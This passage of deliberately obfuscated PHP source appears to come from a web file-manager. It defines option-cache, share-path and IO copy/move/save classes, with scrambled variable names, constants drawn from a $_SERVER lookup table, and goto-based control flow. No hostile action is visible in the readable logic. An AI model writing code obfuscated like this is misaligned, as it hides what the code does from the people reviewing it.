$_SERVER[¬ÏÕ§Áú][32]); if (!$²üâ ¼§ || !isset($²üâ ¼§[$™ú£‰ï€])) { return $™ú£‰ï€; } for ($£½å‘ıÚ = 1; $£½å‘ıÚ < count($²üâ ¼§); $£½å‘ıÚ++) { $°Á„ÒóŸ = $™ú£‰ï€ . "\50{$£½å‘ıÚ}\51"; if (!isset($²üâ ¼§[$°Á„ÒóŸ])) { return $°Á„ÒóŸ; } } return $°Á„ÒóŸ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Íª…öğ = false, $¶ÆÑ÷„ƒ = '', $ƒ¯õĞ¶İ = false) { $¬÷ÛÍé§ =& $_SERVER[¬ÏÕ§Áú]; $Ûä©úì = $this->cacheGet($¶ÆÑ÷„ƒ); $†Ù¶´Ñä = $this->optionDefault($¶ÆÑ÷„ƒ); $†Ù¶´Ñä = is_array($†Ù¶´Ñä) ? $†Ù¶´Ñä : array(); if (is_array($Ûä©úì)) { $Ûä©úì = array_merge($†Ù¶´Ñä, $Ûä©úì); return $Íª…öğ ? isset($Ûä©úì[$Íª…öğ]) ? $Ûä©úì[$Íª…öğ] : null : $Ûä©úì; } $”ÄÃÚ¦ä = $this->filterWhere(array($¬÷ÛÍé§[33] => $¶ÆÑ÷„ƒ)); $Ûä©úì = $this->where($”ÄÃÚ¦ä)->select(); $Ûä©úì = array_to_keyvalue($Ûä©úì, $¬÷ÛÍé§[107], $¬÷ÛÍé§[461]); foreach ($Ûä©úì as $êÌ›àÎ => $ù²á–÷) { if ($ƒ¯õĞ¶İ || in_array($êÌ›àÎ, $this->jsonField)) { $Ûä©úì[$êÌ›àÎ] = json_decode($ù²á–÷, !0); } } $this->cacheSet($¶ÆÑ÷„ƒ, $Ûä©úì); $Ûä©úì = array_merge($†Ù¶´Ñä, $Ûä©úì); return $Íª…öğ ? $Ûä©úì[$Íª…öğ] : $Ûä©úì; } public function set($ÄôÍÚÖ, $÷Û°Áä¡ = false, $’”¿÷„³ = '') { $§Ââş =& $_SERVER[¬ÏÕ§Áú]; if (!$ÄôÍÚÖ) { return !0; } $ïÁÄ•ùÑ = $this->get(!1, $’”¿÷„³); $ïÁÄ•ùÑ = is_array($ïÁÄ•ùÑ) ? $ïÁÄ•ùÑ : array(); $ËúÍöÂ = array(); $éÌ™ÖÀ› = array(); $ïÉ†ûè‘ = array(); $Ğº„¨ˆ© = is_array($ÄôÍÚÖ) ? $ÄôÍÚÖ : array($ÄôÍÚÖ => $÷Û°Áä¡); $­¾Œº¹  = $this->filterWhere(array($§Ââş[33] => $’”¿÷„³)); foreach ($Ğº„¨ˆ© as $¹€°‘Ğ => $£ ª£ÆÕ) { if (is_array($£ ª£ÆÕ)) { $£ ª£ÆÕ = json_encode_force($£ ª£ÆÕ); } $this->checkLength($£ ª£ÆÕ, !1, $this->tableName . $§Ââş[4] . $ÄôÍÚÖ); $£ ª£ÆÕ = self::textEncode($£ ª£ÆÕ); if (array_key_exists($¹€°‘Ğ, $ïÁÄ•ùÑ)) { $„¤÷•Ûò = is_array($ïÁÄ•ùÑ[$¹€°‘Ğ]) ? json_encode_force($ïÁÄ•ùÑ[$¹€°‘Ğ]) : $ïÁÄ•ùÑ[$¹€°‘Ğ]; $„¤÷•Ûò = self::textEncode($„¤÷•Ûò); if ($„¤÷•Ûò === $£ ª£ÆÕ) { continue; } $éÌ™ÖÀ›[] = array($§Ââş[107], $¹€°‘Ğ, $§Ââş[461], $£ ª£ÆÕ, $§Ââş[98], time()); } else { $±íÎó”  = array($§Ââş[33] => $’”¿÷„³, $§Ââş[107] => $¹€°‘Ğ, $§Ââş[461] => $£ ª£ÆÕ); $ËúÍöÂ[] = $this->filterWhere($±íÎó” ); } } if (!$ËúÍöÂ && !$éÌ™ÖÀ›) { return !0; } $this->cacheRemove($’”¿÷„³); $«å°½À¿ = $this->cacheKey($§Ââş[496]); CacheLock::lock($«å°½À¿); if ($ËúÍöÂ) { $this->addAll($ËúÍöÂ); } if ($éÌ™ÖÀ›) { $this->saveAll($éÌ™ÖÀ›, $­¾Œº¹ ); } CacheLock::unlock($«å°½À¿); return !0; } protected function optionDefault($‚¥ÕÍ™ç = '') { return !1; } public function setDeep($¯İô´„ , $Á®æ¯’á = false, $Èåû„Ï€ = '') { $Ç«± Ãó = explode($_SERVER[¬ÏÕ§Áú][10], $¯İô´„ ); $ãç¢½Ïû = $this->get(); array_set_value($ãç¢½Ïû, $¯İô´„ , $Á®æ¯’á); $this->set($Ç«± Ãó[0], $ãç¢½Ïû[$Ç«± Ãó[0]], $Èåû„Ï€); } public function remove($—²üĞ²¤, $¾¦ùß“ = '') { $ºÛ±°Øç =& $_SERVER[¬ÏÕ§Áú]; $this->cacheRemove($¾¦ùß“); $á¦ñÙß­ = $this->filterWhere(array($ºÛ±°Øç[107] => $—²üĞ²¤, $ºÛ±°Øç[33] => $¾¦ùß“)); if (is_null($—²üĞ²¤)) { unset($á¦ñÙß­[$ºÛ±°Øç[107]]); } return $this->where($á¦ñÙß­)->delete(); } public function removeArr($’„­ŸˆÆ, $¥ş¦‰À‡ = '') { $ñ”âäğÅ =& $_SERVER[¬ÏÕ§Áú]; if (!$’„­ŸˆÆ || !is_array($’„­ŸˆÆ)) { return !0; } $this->cacheRemove($¥ş¦‰À‡); $Ù‰Óö»¯ = $this->filterWhere(array($ñ”âäğÅ[33] => $¥ş¦‰À‡, $ñ”âäğÅ[107] => array($ñ”âäğÅ[7], $’„­ŸˆÆ))); return $this->where($Ù‰Óö»¯)->delete(); } public function cacheSet($©¾ÁûÉŸ, $şş„÷ = false) { return Cache::set($this->cacheKey($©¾ÁûÉŸ), $şş„÷); } public function cacheGet($ò×±¾Øà) { return Cache::get($this->cacheKey($ò×±¾Øà)); } public function cacheRemove($õ¨ ¯ş) { return Cache::remove($this->cacheKey($õ¨ ¯ş)); } protected function filterWhere($¥±ØÄÄâ) { return $¥±ØÄÄâ; } protected function cacheKey($Êñ†ßê¦) { return $Êñ†ßê¦; } } goto c’ù§ßàÉ¸; e¸É¡°¯§Ø: define($_SERVER[¬ÏÕ§Áú][328], 2); define($_SERVER[¬ÏÕ§Áú][329], 3); define($_SERVER[¬ÏÕ§Áú][330], 1); goto d•ÑÃåÃ¬µ; E¢Ù„Òƒ™: class PathDriverDriverShareItem { public function __construct($Ú‰‡¿æ¼) { $this->pathParse = $Ú‰‡¿æ¼; } public function __call($³éÌÖ¡ , $ÑîÁâÄì) { $‰÷ØŠ¦İ =& $_SERVER[¬ÏÕ§Áú]; if (method_exists($this, $³éÌÖ¡ )) { return; } $Ï¯Å¹Éò = call_user_func_array(array($‰÷ØŠ¦İ[1492], $³éÌÖ¡ ), $ÑîÁâÄì); $ŒÔ¥Ë·ù = array($‰÷ØŠ¦İ[1493], $‰÷ØŠ¦İ[1494], $‰÷ØŠ¦İ[1495], $‰÷ØŠ¦İ[1496], $‰÷ØŠ¦İ[642], $‰÷ØŠ¦İ[644], $‰÷ØŠ¦İ[1497], $‰÷ØŠ¦İ[120], $‰÷ØŠ¦İ[1498], $‰÷ØŠ¦İ[1499]); if (in_array($³éÌÖ¡ , $ŒÔ¥Ë·ù)) { $Ï¯Å¹Éò = $this->getPathOuter($Ï¯Å¹Éò); } return $Ï¯Å¹Éò; } public function copy($ À˜£àç, $ÀÍ³²û, $¹Æ‰úÑ¤ = false, $»ÑÖ’Ü = false) { return $this->copyMove($ À˜£àç, $ÀÍ³²û, $¹Æ‰úÑ¤, $_SERVER[¬ÏÕ§Áú][642], $»ÑÖ’Ü); } public function move($­÷ü¨©, $Àé ›ü, $¬ÚßÇëÂ = false, $¯–ëÄ° = false) { return $this->copyMove($­÷ü¨©, $Àé ›ü, $¬ÚßÇëÂ, $_SERVER[¬ÏÕ§Áú][644], $¯–ëÄ°); } private function copyMove($ÜÅ¾Êà, $„´ãã¢, $ûËùúÑ, $üóú³Ãı, $ÖêŠâ»Õ = false) { $è–Œ÷ç =& $_SERVER[¬ÏÕ§Áú]; $ÜØ„‹çµ = $„´ãã¢; $ßµ­©Æ† = IO::driverMake($„´ãã¢); if ($ßµ­©Æ†->pathParse[$è–Œ÷ç[1285]]) { $„´ãã¢ = $ßµ­©Æ†->pathParse[$è–Œ÷ç[1285]]; } else { $„´ãã¢ = $ÜØ„‹çµ; } $åÈå×ñ® = IO::copyMove($ÜÅ¾Êà, $„´ãã¢, $ûËùúÑ, $üóú³Ãı, $ÖêŠâ»Õ); $åÈå×ñ® = $this->getPathOuter($åÈå×ñ®); return $åÈå×ñ®; } public function pathThis($ªËÚ»³ˆ) { return get_path_this($this->pathParse[$_SERVER[¬ÏÕ§Áú][97]]); } public function pathFather($Ë£´Å©Ô) { return get_path_father($this->pathParse[$_SERVER[¬ÏÕ§Áú][97]]); } public function iconvSystem($Å¹â£××) { return $Å¹â£××; } protected function infoParse($Ø¦†½Á„, $à¶ƒ¯ü = false) { $Àó¹ûÜ =& $_SERVER[¬ÏÕ§Áú]; $ÄÆÒ èÀ = $this->pathParse[$Àó¹ûÜ[581]][$Àó¹ûÜ[1312]] . $this->pathParse[$Àó¹ûÜ[1304]]; if ($à¶ƒ¯ü) { $±ıèö¡© = IO::infoWithChildren($ÄÆÒ èÀ); } else { $±ıèö¡© = IO::info($ÄÆÒ èÀ); } $îõ‹™¯ö = $this->pathParse[$Àó¹ûÜ[581]]; return Action($Àó¹ûÜ[1490])->_shareItemeParse($±ıèö¡©, $îõ‹™¯ö); } public function listAll($ –û ûû) { $´øÙåï¥ =& $_SERVER[¬ÏÕ§Áú]; $ß¤ÑÖÏê = IO::listAll($ –û ûû); $—À¤¾ = rtrim($this->pathParse[$´øÙåï¥[581]][$´øÙåï¥[1312]], $´øÙåï¥[8]); foreach ($ß¤ÑÖÏê as &$ùã’É½) { $ùã’É½[$´øÙåï¥[97]] = $this->pathDriver . $´øÙåï¥[8] . ltrim(substr($ùã’É½[$´øÙåï¥[97]], strlen($—À¤¾)), $´øÙåï¥[8]); } unset($ùã’É½); return $ß¤ÑÖÏê; } public function listAllSimple($óÒ°óÍÕ, $şÚØëÕÑ = false) { $çÆ«¶ =& $_SERVER[¬ÏÕ§Áú]; $—Ş¬ùÑñ = $this->listAll($óÒ°óÍÕ); $ªƒĞÒê = $this->pathParse[$çÆ«¶[515]]; if (trim($ªƒĞÒê, $çÆ«¶[8]) == trim(get_path_father($ªƒĞÒê), $çÆ«¶[8])) { $şÚØëÕÑ = !0; } return IO::init($çÆ«¶[12])->listAllSimpleMake($—Ş¬ùÑñ, $ªƒĞÒê, $şÚØëÕÑ); } public function getPathOuter($˜–ÊùûÊ) { $ŞÒ¬´è =& $_SERVER[¬ÏÕ§Áú]; $öÎä·¹› = KodIO::parse($˜–ÊùûÊ); if ($öÎä·¹›[$ŞÒ¬´è[33]] == KodIO::KOD_SHARE_ITEM) { return $öÎä·¹›[$ŞÒ¬´è[97]]; } $Ò²ÉÛì = KodIO::clear($˜–ÊùûÊ); $øØãıï´ = KodIO::clear($this->pathParse[$ŞÒ¬´è[581]][$ŞÒ¬´è[1312]]); $Úª”Ô·  = substr($Ò²ÉÛì, strlen($øØãıï´)); if (substr($Ò²ÉÛì, 0, strlen($øØãıï´)) != $øØãıï´) { return !1; } return $this->pathParse[$ŞÒ¬´è[1305]] . $ŞÒ¬´è[8] . ltrim($Úª”Ô· , $ŞÒ¬´è[8]); } public function getType() { $Êğ–§â¿ =& $_SERVER[¬ÏÕ§Áú]; $ãìê¿îø = str_replace($Êğ–§â¿[87], $Êğ–§â¿[12], get_class($this)); return strtolower($ãìê¿îø); } public function isOsDriver($˜ÖãöŸ) { return IO::isOsDriver($˜ÖãöŸ); } public function info($ÅíûÊ—†) { return $this->infoParse($ÅíûÊ—†); } public function infoAuth($ÔˆÃ¡†é) { return $this->infoParse($ÔˆÃ¡†é); } public function infoWithChildren($•»€Ù”¿) { return $this->infoParse($•»€Ù”¿, !0); } public function infoFull($ûä£Œ­) { return $this->infoParse($ûä£Œ­); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($òŞ÷ù›ò) { $this->pathParse = $òŞ÷ù›ò; } protected function infoParse($•Åú©¤ù, $Ö†¿ĞÊ = false) { $”«à›Ú„ =& $_SERVER[¬ÏÕ§Áú]; return Action($”«à›Ú„[1311])->sharePathInfo($this->pathParse[$”«à›Ú„[97]], !0, $Ö†¿ĞÊ); } public function listPath($‚Êé¸¡¬, $ªİŸ¹¹µ = false) { $ä±¢°±Ã =& $_SERVER[¬ÏÕ§Áú]; $“ÒŸ½Ú— = IO::listPath($‚Êé¸¡¬, $ªİŸ¹¹µ); if (!$“ÒŸ½Ú—) { return $“ÒŸ½Ú—; } if (is_array($“ÒŸ½Ú—[$ä±¢°±Ã[1491]])) { $Éäí²öÇ = Action($ä±¢°±Ã[1500])->parsePathChildren($“ÒŸ½Ú—[$ä±¢°±Ã[1491]], array($ä±¢°±Ã[515] => $‚Êé¸¡¬)); $“ÒŸ½Ú—[$ä±¢°±Ã[1491]] = Action($ä±¢°±Ã[1311])->shareItemInfo($Éäí²öÇ); } foreach ($“ÒŸ½Ú— as $‘éû“ä„ => $’‹„ğ¨Ò) { if (!in_array($‘éû“ä„, array($ä±¢°±Ã[96], $ä±¢°±Ã[95]))) { continue; } foreach ($’‹„ğ¨Ò as $›ıæ»¡Ö => $Éäí²öÇ) { $Éäí²öÇ = Action($ä±¢°±Ã[1500])->parsePathChildren($Éäí²öÇ, array($ä±¢°±Ã[515] => $‚Êé¸¡¬)); $“ÒŸ½Ú—[$‘éû“ä„][$›ıæ»¡Ö] = Action($ä±¢°±Ã[1311])->shareItemInfo($Éäí²öÇ); } } return $“ÒŸ½Ú—; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($Ô­ÃÙá) { parent::__construct($Ô­ÃÙá); $this->setSignVersion($_SERVER[¬ÏÕ§Áú][260]); } } goto f‰œÓ’÷; Aš½İö§ê’: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ø’’¢œ…, $±ÑÔ¾ù¢) { $âª®Ø˜ =& $_SERVER[¬ÏÕ§Áú]; $­ûÖåîø = $±ÑÔ¾ù¢; $GLOBALS[$âª®Ø˜[1279]] = $âª®Ø˜[1280] . $ø’’¢œ…; Hook::trigger($âª®Ø˜[1280] . $ø’’¢œ… . $âª®Ø˜[1281], $­ûÖåîø); $´äºÆùô = self::driverMake($±ÑÔ¾ù¢[0]); if (!$´äºÆùô) { return !1; } if ($ø’’¢œ… == $âª®Ø˜[642] || $ø’’¢œ… == $âª®Ø˜[644] || $ø’’¢œ… == $âª®Ø˜[1282]) { if (!trim($´äºÆùô->path . $âª®Ø˜[69], $âª®Ø˜[8])) { return !1; } } if (method_exists($´äºÆùô, $ø’’¢œ…)) { $¨Ğ²ÊŒ² = @call_user_func_array(array($´äºÆùô, $ø’’¢œ…), $±ÑÔ¾ù¢); } else { if (method_exists($´äºÆùô, $âª®Ø˜[1283])) { $¨Ğ²ÊŒ² = @call_user_func_array(array($´äºÆùô, $ø’’¢œ…), $±ÑÔ¾ù¢); } else { if (method_exists(self, $ø’’¢œ…)) { $¨Ğ²ÊŒ² = @call_user_func_array(array(self, $ø’’¢œ…), $±ÑÔ¾ù¢); } else { $¨Ğ²ÊŒ² = call_user_func_array(array(parent, $ø’’¢œ…), $±ÑÔ¾ù¢); } } } Hook::trigger($âª®Ø˜[1280] . $ø’’¢œ… . $âª®Ø˜[1284], $­ûÖåîø, $¨Ğ²ÊŒ²); return $¨Ğ²ÊŒ²; } public static function init($ñ˜–¼û ) { return self::driverMake($ñ˜–¼û ); } public static function copy($©´å”©ì, $ÁàƒÎşØ, $©‘°Ìğ” = false, $ƒ«–Ü¡ = false) { return self::copyMoveStart($©´å”©ì, $ÁàƒÎşØ, $©‘°Ìğ”, $_SERVER[¬ÏÕ§Áú][642], $ƒ«–Ü¡); } public static function move($ôîĞıÄ, $Ãé‹„‹µ, $Á¹´ìÇº = false, $•Û—«ïñ = false) { return self::copyMoveStart($ôîĞıÄ, $Ãé‹„‹µ, $Á¹´ìÇº, $_SERVER[¬ÏÕ§Áú][644], $•Û—«ïñ); } public static function copyMoveChildren($¥şÊ–, $‘—Ñ ñ©, $¨¶§ Ö = "\143\x6f\x70\x79", $©–òÀ°÷ = REPEAT_REPLACE) { $¨öÊ‰ñ =& $_SERVER[¬ÏÕ§Áú]; $€‹ç•Ÿ = $¥şÊ–; $ÓÇÅãŒÛ = self::driverMake($¥şÊ–); $¡¹€„®€ = $ÓÇÅãŒÛ->listPath($¥şÊ–, !0); $ˆ­ÉÙó› = array_merge($¡¹€„®€[$¨öÊ‰ñ[96]], $¡¹€„®€[$¨öÊ‰ñ[95]]); foreach ($ˆ­ÉÙó› as $ºğ‚ÈêÀ) { self::copyMoveStart($ºğ‚ÈêÀ[$¨öÊ‰ñ[97]], $‘—Ñ ñ©, $©–òÀ°÷, $¨¶§ Ö, !1); } if ($¨¶§ Ö == $¨öÊ‰ñ[644]) { self::remove($€‹ç•Ÿ); } } private static function copyMoveStart($®—ğâõ÷, $Ø¼ÓÅğª, $‚†…ì, $…şÕİ, $ÃÇşÕÀ) { $æÒ©Î²¥ =& $_SERVER[¬ÏÕ§Áú]; $Èç·˜‡ = array($®—ğâõ÷, $Ø¼ÓÅğª, $‚†…ì, $ÃÇşÕÀ); Hook::trigger($æÒ©Î²¥[1280] . $…şÕİ . $æÒ©Î²¥[1281], $Èç·˜‡); $ø–—Èâ„ = self::copyMove($®—ğâõ÷, $Ø¼ÓÅğª, $‚†…ì, $…şÕİ, $ÃÇşÕÀ); Hook::trigger($æÒ©Î²¥[1280] . $…şÕİ . $æÒ©Î²¥[1284], $Èç·˜‡, $ø–—Èâ„); return $ø–—Èâ„; } public static function saveFile($›Ú‘ìúï, $î™µË’ã, $Ó±î©”Æ = true) { $ŸÆ¤Õ‡ë =& $_SERVER[¬ÏÕ§Áú]; $Úßî‹º = self::info($î™µË’ã); $ë³¼Ññ‰ = self::driverMake($›Ú‘ìúï); $ú¥ˆëÆ = self::driverMake($î™µË’ã); $Û÷¶˜ó™ = !1; if ($ú¥ˆëÆ->pathParse[$ŸÆ¤Õ‡ë[1285]]) { $Û÷¶˜ó™ = $ú¥ˆëÆ; $˜çÆÆè = $ú¥ˆëÆ->pathParse[$ŸÆ¤Õ‡ë[1285]]; $ú¥ˆëÆ = self::driverMake($˜çÆÆè); } if ($ë³¼Ññ‰->pathParse[$ŸÆ¤Õ‡ë[1285]]) { $ÏäœÍìĞ = $ë³¼Ññ‰->pathParse[$ŸÆ¤Õ‡ë[1285]]; $ë³¼Ññ‰ = self::driverMake($ÏäœÍìĞ); } $ø–ˆ¬º¶ = $ú¥ˆëÆ->pathFather($î™µË’ã); $èÃ®Ö— = !0; if (!$Ó±î©”Æ && self::driverIsSame($ë³¼Ññ‰, $ú¥ˆëÆ)) { $èÃ®Ö— = !1; } $à¸çí´Ê = self::copyFile($ë³¼Ññ‰, $›Ú‘ìúï, $ú¥ˆëÆ, $ø–ˆ¬º¶, $Úßî‹º[$ŸÆ¤Õ‡ë[32]], $èÃ®Ö—); if ($Û÷¶˜ó™) { $à¸çí´Ê = $Û÷¶˜ó™->getPathOuter($à¸çí´Ê); } return $à¸çí´Ê; } private static function copyMove($ŞØº³–Õ, $–çïÒø, $Ìä„àÚÅ, $ÃßÓ©ÖÃ, $€¦ÏíèÃ = false) { $º”ıíÙ¼ =& $_SERVER[¬ÏÕ§Áú]; if (!$ŞØº³–Õ || $ŞØº³–Õ == $º”ıíÙ¼[8] || !$–çïÒø) { return !1; } ignore_timeout(); $ØÙ®µË¿ = self::driverMake($ŞØº³–Õ); $ıßêˆËª = self::driverMake($–çïÒø); $±æÆŒ® = $ÃßÓ©ÖÃ == $º”ıíÙ¼[644]; $ ıÎúñæ = !1; if ($ıßêˆËª->pathParse[$º”ıíÙ¼[1285]]) { $ ıÎúñæ = $ıßêˆËª; $–çïÒø = $ıßêˆËª->pathParse[$º”ıíÙ¼[1285]]; $ıßêˆËª = self::driverMake($–çïÒø); } if ($ØÙ®µË¿->pathParse[$º”ıíÙ¼[1285]]) { $ŞØº³–Õ = $ØÙ®µË¿->pathParse[$º”ıíÙ¼[1285]]; $ØÙ®µË¿ = self::driverMake($ŞØº³–Õ); } self::check($ØÙ®µË¿, $ŞØº³–Õ, $ıßêˆËª, $–çïÒø); Hook::trigger($º”ıíÙ¼[1286], $ØÙ®µË¿, $ŞØº³–Õ, $ıßêˆËª, $–çïÒø); $†©Í„Ì° = self::driverIsSame($ØÙ®µË¿, $ıßêˆËª); if ($†©Í„Ì°) { if ($ÃßÓ©ÖÃ == $º”ıíÙ¼[644] && !method_exists($ıßêˆËª, $º”ıíÙ¼[1287]) && trim($–çïÒø, $º”ıíÙ¼[8]) == trim($ıßêˆËª->pathFather($ŞØº³–Õ), $º”ıíÙ¼[8])) { if ($ØÙ®µË¿->pathThis($ŞØº³–Õ) != $€¦ÏíèÃ && !$ØÙ®µË¿->isOsDriver()) { return $ØÙ®µË¿->rename($ŞØº³–Õ, $€¦ÏíèÃ); } return $ıßêˆËª->getPathOuter($ŞØº³–Õ); } if (method_exists($ıßêˆËª, $ÃßÓ©ÖÃ)) { return $ıßêˆËª->{$ÃßÓ©ÖÃ}($ŞØº³–Õ, $–çïÒø, $Ìä„àÚÅ, $€¦ÏíèÃ); } } if ($†©Í„Ì° && $ÃßÓ©ÖÃ == $º”ıíÙ¼[644] && $ıßêˆËª->getType() == $º”ıíÙ¼[119]) { $İœ¤ò¬ç = $ıßêˆËª->movePath($ŞØº³–Õ, $–çïÒø, $€¦ÏíèÃ); if ($İœ¤ò¬ç) { return $İœ¤ò¬ç; } } $Õ×˜ºÑò = $ØÙ®µË¿->isFile($ŞØº³–Õ); if (!$Õ×˜ºÑò && $ıßêˆËª->getType() == $º”ıíÙ¼[871] && $ØÙ®µË¿->getType() == $º”ıíÙ¼[119]) { $İœ¤ò¬ç = $ıßêˆËª->copyFolderFromIO($ØÙ®µË¿, $ŞØº³–Õ, $–çïÒø, $Ìä„àÚÅ, $±æÆŒ®, $€¦ÏíèÃ); } else { $İœ¤ò¬ç = self::copyPath($ØÙ®µË¿, $ŞØº³–Õ, $ıßêˆËª, $–çïÒø, $Ìä„àÚÅ, $±æÆŒ®, $Õ×˜ºÑò, $€¦ÏíèÃ); } if ($İœ¤ò¬ç && $±æÆŒ®) { $ØÙ®µË¿->remove($ŞØº³–Õ); } if ($ ıÎúñæ) { $İœ¤ò¬ç = $ ıÎúñæ->getPathOuter($İœ¤ò¬ç); } return $İœ¤ò¬ç; } private static function check($ı°éşßñ, $îõ²¸å¸, $¼…®õÊ, &$”€İ¦ö) { $”Œì´Ö =& $_SERVER[¬ÏÕ§Áú]; if (self::driverIsSame($ı°éşßñ, $¼…®õÊ) && $ı°éşßñ->isFolder($îõ²¸å¸) && $ı°éşßñ->isParentOf($îõ²¸å¸, $”€İ¦ö)) { show_json(LNG($”Œì´Ö[1288]), !1); } if (!$ı°éşßñ->exist($îõ²¸å¸)) { show_json(LNG($”Œì´Ö[118]), !1); } } private static function copyPath($¤ï»Šš, $ú¸Ù§Œù, $†´Ù’¿¤, $€»±âíõ, $÷Ô¼ÇÕë, $õûê°ªØ, $Íê¤‡¿, $¸ÂÂå = false, $§Î–ïú = true) { $‚½ë‚Â« =& $_SERVER[¬ÏÕ§Áú]; $¢Û°Ñ’› = empty($¸ÂÂå) && $¸ÂÂå !== $‚½ë‚Â«[241] ? $¤ï»Šš->pathThis($ú¸Ù§Œù) : $¸ÂÂå; if ($÷Ô¼ÇÕë) { $Ù†¦¨ = $†´Ù’¿¤->fileNameExist($€»±âíõ, $¢Û°Ñ’›); $Ìö‘˜î¶ = $¢Û°Ñ’›; $¢Û°Ñ’› = $†´Ù’¿¤->fileNameAuto($€»±âíõ, $¢Û°Ñ’›, $÷Ô¼ÇÕë, !$Íê¤‡¿); if (!$Ù†¦¨ || $Ìö‘˜î¶ != $¢Û°Ñ’›) { $÷Ô¼ÇÕë = !1; } if ($§Î–ïú && !$÷Ô¼ÇÕë) { $†´Ù’¿¤->_data[$‚½ë‚Â«[1289]] = !0; } } if ($Íê¤‡¿) { return self::copyFile($¤ï»Šš, $ú¸Ù§Œù, $†´Ù’¿¤, $€»±âíõ, $¢Û°Ñ’›, $õûê°ªØ); } if ($÷Ô¼ÇÕë == REPEAT_RENAME_FOLDER) { $÷Ô¼ÇÕë = !1; } $¶à•ßùº = rtrim($€»±âíõ, $‚½ë‚Â«[8]) . $‚½ë‚Â«[8] . $¢Û°Ñ’›; $³’ á£ = $†´Ù’¿¤->mkdir($†´Ù’¿¤->getPath($¶à•ßùº), $÷Ô¼ÇÕë); $€»±âíõ = $†´Ù’¿¤->getPathInner($³’ á£); $ëÆœŠËî = $¤ï»Šš->listPath($ú¸Ù§Œù, !0); $ëÆœŠËî = is_array($ëÆœŠËî) ? $ëÆœŠËî : array($‚½ë‚Â«[96] => array(), $‚½ë‚Â«[95] => array()); $èì«ëÌõ = array_merge($ëÆœŠËî[$‚½ë‚Â«[96]], $ëÆœŠËî[$‚½ë‚Â«[95]]); foreach ($èì«ëÌõ as $ºÆó¤Œ¦) { $ñ÷‡‰ù§ = $ºÆó¤Œ¦[$‚½ë‚Â«[33]] == $‚½ë‚Â«[243]; $ú¸Ù§Œù = $¤ï»Šš->getPathInner($ºÆó¤Œ¦[$‚½ë‚Â«[97]]); $×š›Ñˆ = self::copyPath($¤ï»Šš, $ú¸Ù§Œù, $†´Ù’¿¤, $€»±âíõ, $÷Ô¼ÇÕë, $õûê°ªØ, $ñ÷‡‰ù§, !1, !1); if (!$×š›Ñˆ) { IO::errorTips($‚½ë‚Â«[1290] . $ú¸Ù§Œù . $‚½ë‚Â«[83] . $€»±âíõ); } } self::copyMoveKeepInfo($¤ï»Šš, $ú¸Ù§Œù, $³’ á£); return $³’ á£; } private static function copyFile($ìµ©œ–ˆ, $š›óó³, $¡š“·¨ø, $ÆùèŠ°¢, $æš²‹“Ö, $Ù¤çÜ©) { $¸€íè«¤ =& $_SERVER[¬ÏÕ§Áú]; $ÆùèŠ°¢ = $¡š“·¨ø->getPath(rtrim($ÆùèŠ°¢, $¸€íè«¤[8]) . $¸€íè«¤[8] . $æš²‹“Ö); $ì³°×äÒ = $¸€íè«¤[1291] . time() . rand_string(5); Hook::trigger($¸€íè«¤[1292], $ìµ©œ–ˆ, $š›óó³, $¡š“·¨ø, $ÆùèŠ°¢, $æš²‹“Ö, $ì³°×äÒ); if (self::driverIsSame($ìµ©œ–ˆ, $¡š“·¨ø)) { if ($Ù¤çÜ©) { $Â½œéîÊ = $¡š“·¨ø->moveFile($š›óó³, $ÆùèŠ°¢); } else { $Â½œéîÊ = $¡š“·¨ø->copyFile($š›óó³, $ÆùèŠ°¢); } Hook::trigger($¸€íè«¤[1293], $ìµ©œ–ˆ, $š›óó³, $¡š“·¨ø, $ÆùèŠ°¢, $æš²‹“Ö, $Â½œéîÊ); self::copyMoveKeepInfo($ìµ©œ–ˆ, $š›óó³, $Â½œéîÊ); return $Â½œéîÊ; } $½¾ØÎ³ƒ = TEMP_FILES; if ($GLOBALS[$¸€íè«¤[6]][$¸€íè«¤[102]][$¸€íè«¤[914]]) { $½¾ØÎ³ƒ = $GLOBALS[$¸€íè«¤[6]][$¸€íè«¤[102]][$¸€íè«¤[914]]; } $²ß˜§å = $½¾ØÎ³ƒ; mk_dir($²ß˜§å); $íªıâÂ = $²ß˜§å . $ì³°×äÒ; $ÈáŞ«‰« = $íªıâÂ; $íªıâÂ = $ìµ©œ–ˆ->download($š›óó³, $íªıâÂ); $íªıâÂ = $ìµ©œ–ˆ->iconvApp($íªıâÂ); if (substr($íªıâÂ, strlen($½¾ØÎ³ƒ)) == $½¾ØÎ³ƒ) { $Ù¤çÜ© = !0; } $Â½œéîÊ = $¡š“·¨ø->upload($ÆùèŠ°¢, $íªıâÂ, $Ù¤çÜ©); self::remove($ÈáŞ«‰«); Hook::trigger($¸€íè«¤[1293], $ìµ©œ–ˆ, $š›óó³, $¡š“·¨ø, $ÆùèŠ°¢, $æš²‹“Ö, $Â½œéîÊ); self::copyMoveKeepInfo($ìµ©œ–ˆ, $š›óó³, $Â½œéîÊ); return $Â½œéîÊ; } private static function copyMoveKeepInfo($ÖÌ€Ûæ, $ÄÑşÅßî, $áÌØ–•‹) { if (!$áÌØ–•‹) { return; } $£âÜ÷ı¤ = $ÖÌ€Ûæ->info($ÄÑşÅßî); if (!is_array($£âÜ÷ı¤)) { return; } IO::setModifyTime($áÌØ–•‹, $£âÜ÷ı¤[$_SERVER[¬ÏÕ§Áú][98]]); } public static function pathFather($æÜ‹€ÌÜ) { $¿Â¨ï¯‚ = IO::init($æÜ‹€ÌÜ); $‘¹œêòƒ = $¿Â¨ï¯‚->pathFather($¿Â¨ï¯‚->path); return $¿Â¨ï¯‚->getPathOuter($‘¹œêòƒ); } public static function fileOut($­ßØíîı, $ÅÄ¹üñ’ = false, $åñûÌì = false, $¾ÆåØÉ = '') { $§í‚Ñø = self::driverMake($­ßØíîı); if ($§í‚Ñø->isFileOutServer()) { return $§í‚Ñø->fileOutServer($­ßØíîı, $ÅÄ¹üñ’, $åñûÌì, $¾ÆåØÉ); } return $§í‚Ñø->fileOut($­ßØíîı, $ÅÄ¹üñ’, $åñûÌì, $¾ÆåØÉ); } public static function fileOutImage($¢Ûí‚¦, $ùóÊÇÇ = 250) { $Ç¤ƒ± × = array(250, 600, 1200, 2000, 3000, 5000); for ($¸§Óö¡â = 0; $¸§Óö¡â < count($Ç¤ƒ± ×); $¸§Óö¡â++) { if ($¸§Óö¡â == 0 && 